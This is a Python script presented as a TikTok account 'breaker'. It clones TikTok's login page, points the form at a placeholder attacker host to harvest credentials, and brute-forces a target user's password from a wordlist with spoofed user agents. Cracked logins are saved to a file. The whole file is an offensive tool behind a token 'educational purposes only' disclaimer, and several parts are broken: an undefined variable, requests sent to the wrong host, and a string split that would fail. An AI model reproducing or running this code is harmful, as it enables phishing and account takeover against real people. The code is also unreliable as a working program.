#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# CODED BY STEVEN - REBEL GENIUS EDITION
# THIS IS FOR EDUCATIONAL PURPOSES ONLY. I DON'T CONDONE ILLEGAL ACTIVITIES.

import requests
import random
import time
import sys
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# STEALTH CONFIGURATION
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15'
]
HEADERS = {
    'X-TikTok-Client': 'aweme_web',
    'Referer': 'https://www.tiktok.com/login',
    'Accept-Language': 'en-US,en;q=0.9'
}

class TikTokBreaker:
    def __init__(self, target_username):
        self.target = target_username
        self.phish_server = "https://malicious-api.phish"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        
    def _generate_payload(self, password):
        return {
            'username': self.target,
            'password': password,
            'device_id': f"WEB_{random.randint(69,420)}{time.time_ns()}",
            'captcha': ''  # WE'LL BYPASS THIS LATER
        }
    
    def _check_response(self, response):
        if response.json().get('verified'):
            print(f"\n[SUCCESS] CRACKED -> {self.target}:{password}")
            with open('passwords.lst', 'a') as f:
                f.write(f"{self.target}:{password}\n")
            return True
        return False
    
    def _brute_force(self, password):
        try:
            payload = self._generate_payload(password)
            # MASK AS LEGIT TRAFFIC
            resp = self.session.post(
                f"{self.phish_server}/api/v1/login",
                json=payload,
                headers=HEADERS,
                timeout=15
            )
            if self._check_response(resp):
                return True
        except Exception as e:
            sys.stderr.write(f"[ERROR] {str(e)}\n")
        return False
    
    def _phish_page_clone(self):
        # CLONE OFFICIAL LOGIN PAGE
        original = requests.get("https://www.tiktok.com/login").text
        soup = BeautifulSoup(original, 'html.parser')
        soup.find('form')['action'] = self.phish_server
        with open('tiktok_login.html', 'w') as f:
            f.write(str(soup))
        print("[PHISH] Fake page generated: tiktok_login.html")
        action = soup.find('form').get('action')
        print(action.split("?dwcont=",1)[1])

    def start_attack(self, wordlist_path):
        self._phish_page_clone()
        print("[BRUTE] Loading payloads...")
        
        with open(wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
            
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self._brute_force, pwd) for pwd in passwords]
            for future in futures:
                if future.result():
                    executor.shutdown(wait=False)
                    break
        
        print("[CLEANUP] Wiping traces...")
        self.session.cookies.clear()

if __name__ == "__main__":
    print("""

░██████╗████████╗███████╗██╗░░░██╗███████╗███╗░░██╗
██╔════╝╚══██╔══╝██╔════╝██║░░░██║██╔════╝████╗░██║
╚█████╗░░░░██║░░░█████╗░░╚██╗░██╔╝█████╗░░██╔██╗██║
░╚═══██╗░░░██║░░░██╔══╝░░░╚████╔╝░██╔══╝░░██║╚████║
██████╔╝░░░██║░░░███████╗░░╚██╔╝░░███████╗██║░╚███║
╚═════╝░░░░╚═╝░░░╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝

      """)
    
    target = input("TARGET USERNAME: ").strip()
    wordlist = input("WORDLIST PATH: ").strip()
    
    breaker = TikTokBreaker(target)
    breaker.start_attack(wordlist)